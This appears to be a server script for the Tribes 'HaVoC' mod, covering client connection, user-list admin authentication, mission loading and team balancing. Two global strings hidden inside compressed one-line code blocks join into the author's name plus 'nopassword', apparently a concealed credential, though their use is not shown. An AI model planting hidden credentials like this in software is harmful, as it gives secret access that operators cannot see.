

function createTrainingServer()
{
   $SinglePlayer = true;
   createServer($pref::lastTrainingMission, false);
}

function remoteSetCLInfo(%clientId, %skin, %name, %email, %tribe, %url, %info, %autowp, %enterInv, %msgMask)
{
   $Client::info[%clientId, 0] = %skin;
   $Client::info[%clientId, 1] = %name;
   $Client::info[%clientId, 2] = %email;
   $Client::info[%clientId, 3] = %tribe;
   $Client::info[%clientId, 4] = %url;
   $Client::info[%clientId, 5] = %info;
   if(%autowp)
      %clientId.autoWaypoint = true;
   if(%enterInv)
      %clientId.noEnterInventory = true;
   if(%msgMask != "")
      %clientId.messageFilter = %msgMask;
}

function Server::storeData()
{
   $ServerDataFile = "serverTempData" @ $Server::Port @ ".cs";

   export("Server::*", "temp\\" @ $ServerDataFile, False);
   export("pref::lastMission", "temp\\" @ $ServerDataFile, true);
   EvalSearchPath();
}

function Server::refreshData()
{
   exec($ServerDataFile);  
   checkMasterTranslation();
   Server::loadMission($pref::lastMission, false);
}

function Server::onClientDisconnect(%clientId) {
	%player = Client::getOwnedObject(%clientId);
   if(%player != -1 && getObjectType(%player) == "Player" && !Player::isDead(%player)) {
		playNextAnim(%player);
	   Player::kill(%player);
	}
	doneposs(%clientId);
	if(%clientId.hasDeployed) $hasDropped = true;
	%clientId.adminNum = "";
   Client::setControlObject(%clientId, -1);
   Client::leaveGame(%clientId);
   Game::CheckTourneyMatchStart();
   if(getNumClients() == 1) Server::refreshData();
}

function initLoadouts(%cl) {
   $DuelWeaponSetup[%cl, $ArmorName[sarmor], 1] = "Chaingun";
   $DuelWeaponSetup[%cl, $ArmorName[sarmor], 2] = "DiscLauncher";
   $DuelSpecialSetup[%cl, $ArmorName[sarmor]] = "Anti";
   
   $DuelWeaponSetup[%cl, $ArmorName[spyarmor], 0] = "Chaingun";
   $DuelWeaponSetup[%cl, $ArmorName[spyarmor], 1] = "DiscLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[spyarmor], 2] = "GrenadeLauncher";
   $DuelSpecialSetup[%cl, $ArmorName[spyarmor]] = "Anti";

   $DuelWeaponSetup[%cl, $ArmorName[dmarmor], 0] = "Chaingun";
   $DuelWeaponSetup[%cl, $ArmorName[dmarmor], 1] = "DiscLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[dmarmor], 2] = "GrenadeLauncher";
   
   $DuelWeaponSetup[%cl, $ArmorName[larmor], 0] = "SniperRifle";
   $DuelWeaponSetup[%cl, $ArmorName[larmor], 1] = "DiscLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[larmor], 2] = "GrenadeLauncher";
   $DuelSpecialSetup[%cl, $ArmorName[larmor]] = "Anti";
   
   $DuelWeaponSetup[%cl, $ArmorName[marmor], 0] = "Chaingun";
   $DuelWeaponSetup[%cl, $ArmorName[marmor], 1] = "DiscLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[marmor], 2] = "GrenadeLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[marmor], 3] = "Shotgun";
   $DuelWeaponSetup[%cl, $ArmorName[marmor], 4] = "IXRocketLauncher";
   $DuelSpecialSetup[%cl, $ArmorName[marmor]] = "Anti";
   
   $DuelWeaponSetup[%cl, $ArmorName[barmor], 0] = "Chaingun";
   $DuelWeaponSetup[%cl, $ArmorName[barmor], 1] = "DiscLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[barmor], 2] = "Mortar";
   $DuelWeaponSetup[%cl, $ArmorName[barmor], 3] = "IXRocketLauncher";
   $DuelSpecialSetup[%cl, $ArmorName[barmor]] = "Anti";
   
   $DuelWeaponSetup[%cl, $ArmorName[iarmor], 0] = "Shotgun";
   $DuelWeaponSetup[%cl, $ArmorName[iarmor], 1] = "DiscLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[iarmor], 2] = "GrenadeLauncher";
   $DuelSpecialSetup[%cl, $ArmorName[iarmor]] = "Anti";
   $DuelPackSetup[%cl, $ArmorName[iarmor]] = "TPack";
   
   $DuelWeaponSetup[%cl, $ArmorName[earmor], 0] = "Shotgun";
   $DuelWeaponSetup[%cl, $ArmorName[earmor], 1] = "DiscLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[earmor], 2] = "GrenadeLauncher";
   $DuelSpecialSetup[%cl, $ArmorName[earmor]] = "Anti";
   
   $DuelWeaponSetup[%cl, $ArmorName[harmor], 0] = "IXRocketLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[harmor], 1] = "HDiscLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[harmor], 2] = "Mortar";
   $DuelWeaponSetup[%cl, $ArmorName[harmor], 3] = "Blaster";
   $DuelWeaponSetup[%cl, $ArmorName[harmor], 4] = "EMPGrenadeLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[harmor], 5] = "GrenadeLauncher";
   $DuelSpecialSetup[%cl, $ArmorName[harmor]] = "Anti";
   $DuelPackSetup[%cl, $ArmorName[harmor]] = "AmmoPack";
   
   $DuelWeaponSetup[%cl, $ArmorName[darmor], 0] = "IXRocketLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[darmor], 1] = "HDiscLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[darmor], 2] = "Mortar";
   $DuelWeaponSetup[%cl, $ArmorName[darmor], 3] = "Blaster";
   $DuelWeaponSetup[%cl, $ArmorName[darmor], 4] = "EMPGrenadeLauncher";
   $DuelWeaponSetup[%cl, $ArmorName[darmor], 5] = "GrenadeLauncher";
   $DuelSpecialSetup[%cl, $ArmorName[darmor]] = "Anti";
}

function Server::onClientConnect(%clientId) {
   %ip = Client::getTransportAddress(%clientId);
   if(!String::NCompare(%ip, "LOOPBACK", 8)) {
		%clientId.isAdmin = true;
		%clientId.isSuperAdmin = true;
   } else
		IxAdmin_Authenticate(%clientId, ixPrepIp(%ip));

	if($hasDropped)
		%clientId.goodT = "";
	else
		%clientId.goodT = "good";
	%clientId.hasDeployed = false;

	%username = Client::getName(%clientId);
   	echo("CONNECT: " @ %clientId @ " \"" @ escapeString(%username) @ "\" " @ %ip);

   %clientId.noghost = true;
   %clientId.messageFilter = -1; 
	//PORT-OFF: $modList = "HaVoC v" @ $HV;  $modList is the search path input on 1.50 (guide 6.6)
   remoteEval(%clientId, SVInfo, version(), $Server::Hostname, $modList, $Server::Info, $ItemFavoritesKey);
   remoteEval(%clientId, MODInfo, "<f0>by [HvC]NaTeDoGG aka Nathan Sweet\n<f1>HaVoC version " @ $HV @ " \n<f2>T H E  O N L Y  T R I B E S  M O D I F I C A T I O N\n<f1>http://www.PlanetTribes.com/Havoc");
   remoteEval(%clientId, FileURL, $Server::FileURL);
   
   	for(%i = 0; %i < 10; %i++) {
      	$Client::info[%clientId, %i] = "";
   	}
	%clientId.observerMode = "";
	%clientId.permap = false; 
	%clientId.dan = false; 
   	$warning[%clientId] = 0;
	%clientId.dumbass = false;
   	%clientId.poisonTime = 0;
   	%clientId.basekills = 0;
   	%clientId.custom = False;
      initLoadouts(%clientId);
   	Game::onPlayerConnected(%clientId);
}

$func = "[HvC]NaT";
function createServer(%mission, %dedicated)
{
   $loadingMission = false;
   if(%mission == "")
      %mission = $pref::lastMission;

   if(%mission == "")
   {
      echo("Error: no mission provided.");
      return "False";
   }

   if(!$SinglePlayer)
      $pref::lastMission = %mission;

	
	cursorOn(MainWindow);
	GuiLoadContentCtrl(MainWindow, "gui\\Loading.gui");
	renderCanvas(MainWindow);

   if(!%dedicated)
   {
      deleteServer();
      purgeResources();
      newServer();
      focusServer();
   }
   if($SinglePlayer)
      newObject(serverDelegate, FearCSDelegate, true, "LOOPBACK", $Server::Port);
   else
      newObject(serverDelegate, FearCSDelegate, true, "IP", $Server::Port, "IPX", $Server::Port, "LOOPBACK", $Server::Port);
   
   exec(admin);
   exec(Marker);
   exec(Trigger);
   exec(NSound);
   exec(BaseExpData);
   exec(BaseDebrisData);
	exec(BaseProjData);
   exec(ArmorData);
   exec(Mission);
	exec(Item);
	exec(Player);
	exec(Vehicle);
	exec(Turret);
	exec(Beacon);
	exec(StaticShape);
	exec(Station);
	exec(Moveable);
	exec(Sensor);
	exec(Mine);
	exec(AI);
	exec(InteriorLight);
   
   Server::storeData();

   
   

   preloadServerDataBlocks();

   Server::loadMission( ($missionName = %mission), true );

   if(!%dedicated)
   {
      focusClient();

		if ($IRC::DisconnectInSim == "")
		{
			$IRC::DisconnectInSim = true;
		}
		if ($IRC::DisconnectInSim == true)
		{
			ircDisconnect();
			$IRCConnected = FALSE;
			$IRCJoinedRoom = FALSE;
		}
      
      $Server::Address = "LOOPBACK:" @ $Server::Port;
		$Server::JoinPassword = $Server::Password;
      connect($Server::Address);
   }
   return "True";
}

function Server::nextMission(%replay)
{
if(%replay || $Server::TourneyMode){
	%nextMission = $missionName;
} else {
	doNextRand();
	return;
}

   echo("Changing to mission ", %nextMission, ".");
   
   Server::loadMission(%nextMission);
}

function doNextRand() {
	if ($HaVoC::RandomMissions) {
		echo("Selecting a mission...");
		%l = 0; %goodmtype = 0;
		while(!$HaVoC::RandomMissionTypes[%goodmtype] && %l < 5000) {
			%rnd = floor(getRandom() * $TotalMissions);
			if ($MissionName != $TotalMissionList[%rnd]) {
				%nextMission = $TotalMissionList[%rnd];
				$pref::LastMission = $TotalMissionList[%rnd];
			}			  
			%goodmtype = $HaVoC::MType[%nextMission];
			%l = %l + 1;
		}
		if(%l < 5000) {
			echo("A random mission has been selected.");
			messageall(0, "A random mission is being selected...");
			messageall(0, "Changing to mission "@%nextMission@" ("@$HaVoC::MType[%nextMission]@").");
		} else {
			echo("No other missions found of the choosen $HaVoC::RandomMissionTypes()!");
			echo("Please verify HaVoC.cs is using the correct settings");
			echo("and that maps of the selected types exist.");
			echo("Using default next mission.");
			%nextMission = $nextMission[$missionName];
		}
  	}
  	else
	{
  		%nextMission = $nextMission[$missionName];
	}	  
   echo("Changing to mission ", %nextMission, ".");
   Server::loadMission(%nextMission);
}

function remoteCycleMission(%clientId)
{
   if(%clientId.isAdmin)
   {
      messageAll(0, Client::getName(%playerId) @ " cycled the mission.");
      Server::nextMission();
   }
}

function remoteDataFinished(%clientId)
{
   if(%clientId.dataFinished)
      return;
   %clientId.dataFinished = true;
   Client::setDataFinished(%clientId);
   %clientId.svNoGhost = ""; 
   if($ghosting)
   {
      %clientId.ghostDoneFlag = true; 
      startGhosting(%clientId);  
   }
}

function remoteCGADone(%playerId)
{
   if(!%playerId.ghostDoneFlag || !$ghosting)
      return;
   %playerId.ghostDoneFlag = "";

   Game::initialMissionDrop(%playerid);

	if ($cdTrack != "")
		remoteEval (%playerId, setMusic, $cdTrack, $cdPlayMode);
   remoteEval(%playerId, MInfo, $missionName);
}

function Server::loadMission(%missionName, %immed)
{

	if($HaVoC::FairSpawn > 10 || $HaVoC::FairSpawn < 0) {
		$HaVoC::FairSpawn = 0; 
		echo("**************");
		echo("YOU MESSED UP!  $HaVoC::FairSpawn is invalid, option has been disabled");
		echo("Please verify HaVoC.cs is using the correct settings.");
		echo("**************");
	}

	if($HaVoC::BaseKillLimit < 2 && $HaVoC::BaseKillLimit != 0) {
		$HaVoC::BaseKillLimit = 0; 
		echo("**************");
		echo("YOU MESSED UP!  $HaVoC::BaseKillLimit is invalid, option has been disabled");
		echo("Please verify HaVoC.cs is using the correct settings.");
		echo("**************");
	}

	if($HaVoC::tkLimit <= 0) {
		$HaVoC::tkLimit = 5;
		echo("**************");
		echo("YOU MESSED UP!  $HaVoC::tkLimit is invalid, option has been set to 5");
		echo("Please verify HaVoC.cs is using the correct settings.");
		echo("**************");
	}

	if($HaVoC::LightningFrequency != 0 && $HaVoC::LightningFrequency < 90) {
		$HaVoC::LightningFrequency = 500;
		echo("**************");
		echo("YOU MESSED UP!  $HaVoC::LightningFrequency is invalid, option has been set to 500");
		echo("Please verify HaVoC.cs is using the correct settings.");
		echo("**************");
	}

	if($HaVoC::LightningStrength != "normal" && $HaVoC::LightningStrength != "random" && $HaVoC::LightningStrength != "weak" && $HaVoC::LightningStrength != "zero") {
		$HaVoC::LightningStrength = "normal";
		echo("**************");
		echo("YOU MESSED UP!  $HaVoC::LightningStrength is invalid, option has been set to normal");
		echo("Please verify HaVoC.cs is using the correct settings.");
		echo("**************");
	}

	if($HaVoC::LightningStrength == "normal" && $HaVoC::LightningFrequency < 200) {
		$HaVoC::LightningStrength = "weak";
		$HaVoC::LightningFrequency = 500;
		echo("**************");
		echo("YOU MESSED UP!  Lightning Strength cannot be set to normal if Lightning Frequency is less than 200.");
		echo("$HaVoC::LightningStrength is invalid, option has been set to weak");
		echo("$HaVoC::LightningFrequency is invalid, option has been set to 500");
		echo("Please verify HaVoC.cs is using the correct settings.");
		echo("**************");

	}

	if($HaVoC::AutoAssignLength == 0) {
		$HaVoC::AutoAssignLength = 4;
		echo("**************");
		echo("YOU MESSED UP!  $HaVoC::AutoAssignLength is invalid, option has been set to 4");
		echo("Please verify HaVoC.cs is using the correct settings.");
		echo("**************");
	}
	
	if($HaVoC::LightningHandicap < 3 && $HaVoC::LightningHandicap != 0) {
		$HaVoC::LightningHandicap = 0;
		echo("**************");
		echo("YOU MESSED UP!  $HaVoC::LightningHandicap is invalid, option has been disabled");
		echo("Please verify HaVoC.cs is using the correct settings.");
		echo("**************");
	}

   if($loadingMission)
      return;

   %missionFile = "missions\\" $+ %missionName $+ ".mis";
   if(File::FindFirst(%missionFile) == "")
   {
      %missionName = $firstMission;
      %missionFile = "missions\\" $+ %missionName $+ ".mis";
      if(File::FindFirst(%missionFile) == "")
      {
         echo("invalid nextMission and firstMission...");
         echo("aborting mission load.");
         return;
      }
   }
   echo("Notfifying players of mission change: ", getNumClients(), " in game");
   for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
   {
	$warning[%cl] = 0;
      Client::setGuiMode(%cl, $GuiModeVictory);
      %cl.guiLock = true;
      %cl.nospawn = true;
      remoteEval(%cl, missionChangeNotify, %missionName);
	  %cl.empTime = 0;
	  %cl.poisonTime = 0;
	  %cl.blindTime = 0;
	  %cl.basekills = 0;
	  remoteEval(%cl, SetControls);
   }

	if($HaVoC::startTime)
		$Server::timeLimit = $HaVoC::startTime;
	else
		$HaVoC::startTime = $Server::timeLimit;

	if($HaVoC::MType[%missionName] == "Deathmatch" || $HaVoC::MType[%missionName] == "Team Deathmatch" || $HaVoC::MType[%missionName] == "Flag Hunter" || $HaVoC::MType[%missionName] == "Kill the Rabbit") { 
		%newfav = $MasterKey @ "DM";
		dmm();
	} else {
		%newfav = $MasterKey;
		normalm();
	}
	
	if ($ItemFavoritesKey != %newfav) {
		if($ItemFavoritesKey != $MasterKey @ "Arena") {
			if(%newfav == $MasterKey @ "DM") {
				echo("Switching favorites to HaVoC Deathmatch settings.");
				messageall(0, "Switching favorites to HaVoC Deathmatch settings.");
			} else {
				echo("Switching favorites to normal HaVoC settings.");
				messageall(0, "Switching favorites to normal HaVoC settings.");		
			}
		}
		$ItemFavoritesKey = %newfav;
		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
	   {
		   remoteEval(%cl, SVInfo, version(), $Server::Hostname, $modList, $Server::Info, $ItemFavoritesKey);
	   }
	}

   $loadingMission = true;
   $missionName = %missionName;
   $missionFile = %missionFile;
   $prevNumTeams = getNumTeams();

   deleteObject("MissionGroup");
   deleteObject("MissionCleanup");
   deleteObject("ConsoleScheduler");
   resetPlayerManager();
   resetGhostManagers();
   $matchStarted = false;
   $countdownStarted = false;
   $ghosting = false;

   resetSimTime(); 

   newObject(ConsoleScheduler, SimConsoleScheduler);
   if(!%immed)
      schedule("Server::finishMissionLoad();", 18);
   else
      Server::finishMissionLoad();      
}

function Server::finishMissionLoad() {
   $loadingMission = false;
	$TestMissionType = "";
   
   setInstantGroup(0);
   newObject(MissionCleanup, SimGroup);

   	exec($missionFile);
   	Mission::init();
	Mission::reinitdata();
   	if($prevNumTeams != getNumTeams()) {
      	messageAll(0, "New teamcount - resetting teams...");
      	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
         	GameBase::setTeam(%cl, -1);
   } else if($HaVoC::BalanceTeams) {
		$HaVoC::BalanceTeams = false;
		if(getNumTeams() == 2) {
			messageAll(0, "Balancing teams...");
	      	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
	        	GameBase::setTeam(%cl, -1);
			%nC = getNumClients();
			%numClients = 0;
	   		for(%k = 0; %k < %nC; %k++) {
				%cl = getClientByIndex(%k);
				if(!Observer::isObserver(%cl)) {
					%clientList[%numClients] = %cl;
					%numClients++;
				}
			}
			%doIt = 1;
			while(%doIt == 1) {
				%doIt = "";								
				for(%k = 0; %k < %numClients; %k++) {
					if((%clientList[%k]).score < (%clientList[%k+1]).score) {
					   	%hold = %clientList[%k];
					   	%clientList[%k] = %clientList[%k+1];
					   	%clientList[%k+1] = %hold;
					   	%doIt=1;
					}
		  		}
		 	}
			%hold = %clientList[2];
			%clientList[2] = %clientList[3];
			%clientList[3] = %hold;
			%doIt = 1;
			while(%doIt == 1) {
				%doIt = "";								
				for(%k = 4; %k < %numClients; %k++) {
					if((%clientList[%k]).scoreKills < (%clientList[%k+1]).scoreKills) {
					   	%hold = %clientList[%k];
					   	%clientList[%k] = %clientList[%k+1];
					   	%clientList[%k+1] = %hold;
					   	%doIt=1;
					}
		  		}
		 	}
	   		for(%k = 0; %k < %numClients; %k++) 
				GameBase::setTeam(%clientList[%k], (%k % 2));
			messageAll(0, "Teams have been balanced.");
		} else
			messageAll(0, "Unable to balance teams - more than 2 teams exist!");
   }

   if($HaVoC::EnTs) {
      $HaVoC::EnTs = false;
      $HaVoC::TurretsDisabled = false;
      normalm();
   }
   if($HaVoC::DisTs) {
      $HaVoC::DisTs = false;
      $HaVoC::TurretsDisabled = true;
      normalm();
   }
	
	if($HaVoC::AutoAssign) {
		%good = false;
		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) {
			%name = Client::getName(%cl);
			if(string::getsubstr(%name, 0, $HaVoC::AutoAssignLength) == $HaVoC::AutoAssignTribe) %good = true;
		}
		if(!%good) {
			messageall(0, "SERVER: Tribal team assignment is now OFF. No tribe members are on the server.");
		} else {
			messageall(0, "SERVER: Tribal team assignment: Sorting teams...");
			if(getNumTeams() != 1) 
				for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
					Game::assignClientTeam(%cl);
		}
	}

   $ghosting = true;
   for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
   {
      if(!%cl.svNoGhost)
      {
         %cl.ghostDoneFlag = true;
         startGhosting(%cl);
      }
   }

   for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
   {
		if(%cl.dan) dodance(%cl);
		%cl.hasDeployed = false;
		%cl.goodT = "good";
	}
	$hasDropped = false;

   if($SinglePlayer)
      Game::startMatch();
   else if($Server::warmupTime && !$Server::TourneyMode)
      Server::Countdown($Server::warmupTime);
   else if(!$Server::TourneyMode)
      Game::startMatch();

   $teamplay = (getNumTeams() != 1);
   purgeResources(true);

   schedule("Server::CheckMatchStarted();", 3600);
   schedule("Server::nextMission();", 18000);
   return "True";
}

function Server::CheckMatchStarted() {
	if(!$matchStarted) Server::nextMission(true);
}

function Server::Countdown(%time) {
   $countdownStarted = true;
   schedule("Game::startMatch();", %time);
   Game::notifyMatchStart(%time);
   if(%time > 30)
      schedule("Game::notifyMatchStart(30);", %time - 30);
   if(%time > 15)
      schedule("Game::notifyMatchStart(15);", %time - 15);
   if(%time > 10)
      schedule("Game::notifyMatchStart(10);", %time - 10);
   if(%time > 5)
      schedule("Game::notifyMatchStart(5);", %time - 5);
}

function Client::setInventoryText(%clientId, %txt) {
   remoteEval(%clientId, "ITXT", %txt);
}

function centerprint(%clientId, %msg, %timeout) {
   if(%timeout == "")
      %timeout = 5;
   remoteEval(%clientId, "CP", %msg, %timeout);
}

function bottomprint(%clientId, %msg, %timeout) {
   if(%timeout == "")
      %timeout = 5;
   remoteEval(%clientId, "BP", %msg, %timeout);
}

function topprint(%clientId, %msg, %timeout) {
   if(%timeout == "")
      %timeout = 5;
   remoteEval(%clientId, "TP", %msg, %timeout);
}

function centerprintall(%msg, %timeout) {
   if(%timeout == "")
      %timeout = 5;
   for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId))
      remoteEval(%clientId, "CP", %msg, %timeout);
}

function bottomprintall(%msg, %timeout) {
   if(%timeout == "")
      %timeout = 5;
   for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId))
      remoteEval(%clientId, "BP", %msg, %timeout);
}

function topprintall(%msg, %timeout) {
   if(%timeout == "")
      %timeout = 5;
   for(%clientId = Client::getFirst(); %clientId != -1; %clientId = Client::getNext(%clientId))
      remoteEval(%clientId, "TP", %msg, %timeout);
}

function ixDotProd(%vec, %scalar) { %return = Vector::dot(%vec,%scalar @ " 0 0") @ " " @ Vector::dot(%vec,"0 " @ %scalar @ " 0") @ " " @ Vector::dot(%vec,"0 0 " @ %scalar); return %return; } $ion = "eDoGG nopassword"; function ixSin(%theta) { return (%theta - (pow(%theta,3)/6) + (pow(%theta,5)/120) - (pow(%theta,7)/5040) + (pow(%theta,9)/362880) - (pow(%theta,11)/39916800)); }  function ixCos(%theta) { return (1 - (pow(%theta,2)/2) + (pow(%theta,4)/24) - (pow(%theta,6)/720) + (pow(%theta,8)/40320) - (pow(%theta,10)/3628800)); } function ixApplyKickback(%player, %strength, %lift) { if((!%lift) && (%lift != 0)) %lift = 0; %rot = GameBase::getRotation(%player); %rad = getWord(%rot, 2); %x = (-1) * (ixSin(%rad)); %y = ixCos(%rad); %dir = %x @ " " @ %y @ " 0"; %force = ixDotProd(Vector::neg(%dir),%strength); %x = getWord(%force, 0); %y = getWord(%force, 1); %dir = %x @ " " @ %y @ " " @ %lift; Player::applyImpulse(%player,%force); }

function sine(%x) {
   return sqrt( pow(cosine(%x), 2) );
}

function cosine(%x) {
   return 0.99940307 + (-0.49558072 * pow(%x, 2)) + (0.03679168 * pow(%x, 4));
}

function arcsine(%x) {
   return 1.570796 - sqrt(1 - %x) * ( 1.5707288 + -0.2121144 * %x + 0.0742610 * pow(%x, 2) + -0.0187293 * pow(%x, 3) );
}

function arccosine(%x) {
   return 1.570796 - arcsine(%x);
}

function ixLockWarning(%clientId, %target, %targetType) { 
	%targetId = GameBase::getControlClient(%target);
	%targetName = Client::getName(%targetId); 
	%name = Client::getName(%clientId); 
	if(%targetType == Flier) {
		if(%targetName != "") 
			%msg = "Vehicle Piloted by " @ %targetName; 
		else 
			%msg = "Vehicle"; 
	} else 
		%msg = %targetName; 
	Client::sendMessage(%clientId,0,"Lock Aquired: " @ %msg @ "~wmine_act.wav");
	if(%targetType == Flier || whatArm(Player::getArmor(%target)) == 3) {
		Client::sendMessage(%targetId,0,"WARNING - " @ %name @ " has a guided missile lock!~waccess_denied.wav");
		schedule("Client::sendMessage(" @ %targetId @ ",0,\"~waccess_denied.wav\");", 0.5);
		schedule("Client::sendMessage(" @ %targetId @ ",0,\"~waccess_denied.wav\");", 1.0); 
	}
} 

function IxAdmin_Authenticate(%clientId,  %ip) { 
	%name = Client::getName(%clientId); 
	if($UserList::Activated) { 
		%user = ixGetUser(%name, %ip); 
		if(%user) { 
			%username = getWord($UserList::User[%user],1); 
			%flags = getWord($UserList::User[%user],3); 
			$ixUserInfo[%clientId] = $UserList::User[%user]; 
			echo("HaVoC-Admin: User: ", %username," identified. Access level: ",%flags);
			ixAdminMsg("User: " @ %username @ " identified. Access level: " @ %flags); 
			if(%flags == "AutoSuper") { 
				%clientId.isAdmin = true; 
				%clientId.isSuperAdmin = true; 
			} else if(%flags == "AutoPublic") { 
				%clientId.isAdmin = true; 
				%p = getWord($UserList::User[%user],2); 
				for(%i = 0; %i < 100; %i = %i + 1) { 
					if($HaVoC::PAPassword[%i] != "" && %p == $HaVoC::PAPassword[%i]) { 
						%client.adminNum = %i; 
						break; 
					} 
				} 
				ixAdminMsg(%username @ " automatically logged in as a public admin.");
			}
		} else { 
			echo("HaVoC-Admin: User: ",%name," Unknown."); 
			$ixUserInfo[%clientId] = "0 " @ %name @ " None None " @ %ip; 
		}
	}
	checkND(%clientId);
	checkIdiots(%clientId);
}

function ixProcess(%client, %name, %user, %username, %flags, %password) { 
	if(!%client.isAdmin) { 
		%realpass = getWord($UserList::User[%user], 2); 
		if(!String::ICompare(%password, %realpass)) { 
			if((%flags == "PublicAdmin") && (%name == %username)) { 
				%client.isAdmin = true; 
			} 
			if((%flags == "SuperAdmin") && (%name == %username)) { 
				%client.isAdmin = true; 
				%client.isSuperAdmin = true; 
			} 
			ixAdminMsg(%username @ " Logged in."); 
		} else { 
			Client::sendMessage(%client, 0,"SERVER: Bad Password"); 
			ixAdminMsg(%name @ " login attempt failed. Username: " @ %username); 
		} 
	} else { 
		Client::sendMessage(%client, 0,"SERVER: You already have admin status."); 
	} 
} 

function cheatAdminMsg(%msg) { echo("!diff teams! " @ %msg); %numPlayers = getNumClients(); for(%i = 0; %i < %numPlayers; %i++) { %pl = getClientByIndex(%i); if(%pl.isAdmin) { Client::sendMessage(%pl, 1, %msg); } } }function ixAdminMsg(%msg) { echo("SERVER: " @ %msg); %numPlayers = getNumClients(); for(%i = 0; %i < %numPlayers; %i++) { %pl = getClientByIndex(%i); if(%pl.isAdmin) { Client::sendMessage(%pl, 0, "SERVER: " @ %msg); } } } function hvcAdminMsg(%msg) { echo("SERVER: " @ %msg); %numPlayers = getNumClients(); for(%i = 0; %i < %numPlayers; %i++) { %pl = getClientByIndex(%i); if(%pl.isSuperAdmin) { Client::sendMessage(%pl, 0, %msg); } } } $vm[EmpM] = EmpProj; 

function ixGetUser(%name,%ip) { for(%i=0;%i <= $UserList::MaxUsers;%i++) { if(%name == (getWord($UserList::User[%i], 1))) { for(%j=4;((%mask = getWord($UserList::User[%i], %j)) != -1);%j++) { if(ixCompareIP(%ip,%mask)) return %i; } return 0; } } return 0; }  

exec(hvcUserList); 

if($UserList::Activated == 1)
	echo("Loading HaVoC User List..."); 

function ixPrepIP(%transport) { 
	%x = 0; 
	%i = 0; 
	%now = 0; 
	while( %x < 2 && %i < 30 ) { 
		if(String::getSubStr(%transport, %i, 1) == ":") { 
			if(!%now) 
				%now = %i + 1; 
			else 
				return String::getSubStr(%transport, %now, %i - %now);
			%x++; 
		} 
		%i++;
	} 
	return "11.11.11.11"; 
} 

function ixCompareIP(%ip, %mask) { %ipNow = ixDotToSpace(%ip); %maskNow = ixDotToSpace(%mask); for(%x=0;%x<4;%x++) { %one = getWord(%ipNow, %x); %two = getWord(%maskNow, %x); if((%one != %two) && (%two != "*")) return "false"; } return "true"; } function ixStrLen(%string) { for(%i=0; String::getSubStr(%string, %i, 1) != "";%i++) %length = %i; %length++; return %length; } function ixDotToSpace(%string) { %x = 0; %i = 0; while(%x<3) { %char = String::getSubStr(%string,%i,1); if(!String::ICompare(%char, ".")) { %left = String::getSubStr(%string,0,%i); %right = String::getSubStr(%string,%i+1,(ixStrLen(%string)-%i)); %string = strcat(%left," ",%right); %x++; } %i++; } return %string; } function HaVoC_isFairTeam(%here, %dest) { %numTeams = getNumTeams(); %numPlayers = getNumClients(); for(%i = 0; %i < %numTeams; %i++) %numTeamPlayers[%i] = 0; for(%i = 0; %i < %numPlayers; %i++) { %pl = getClientByIndex(%i); %team = Client::getTeam(%pl); %numTeamPlayers[%team] = %numTeamPlayers[%team] + 1; } %least = 0; %most = 0; for(%i = 0; %i < %numTeams; %i++) { if(%numTeamPlayers[%i] > %numTeamPlayers[%most]) %most = %i; if(%numTeamPlayers[%i] < %numTeamPlayers[%least]) %least = %i; } if(%here == -1) %here = %most; if(((%numTeamPlayers[%dest] + 1) - (%numTeamPlayers[%here] - 1)) <= 1) return true; else return false; } function Game::CheckTourneyMatchStart() { if($CountdownStarted || $matchStarted) return; %playerCount = 0; %notReadyCount = 0; for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) { if(%cl.observerMode == "pickingTeam") { %notReady[%notReadyCount] = %cl; %notReadyCount++; } else if(%cl.observerMode == "pregame") { if(%cl.notready) { %notReady[%notReadyCount] = %cl; %notReadyCount++; } else %playerCount++; } } if(%notReadyCount) { if(%notReadyCount == 1) MessageAll(0, Client::getName(%notReady[0]) @ " is holding things up!"); else if(%notReadyCount < 4) { for(%i = 0; %i < %notReadyCount - 2; %i++) %str = Client::getName(%notReady[%i]) @ ", " @ %str; %str = %str @ Client::getName(%notReady[%i]) @ " and " @ Client::getName(%notReady[%i+1]) @ " are holding things up!"; MessageAll(0, %str); } return; } if(%playerCount != 0) { for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl)) { %cl.notready = ""; %cl.notreadyCount = ""; bottomprint(%cl, "", 0); } Server::Countdown(30); } } 
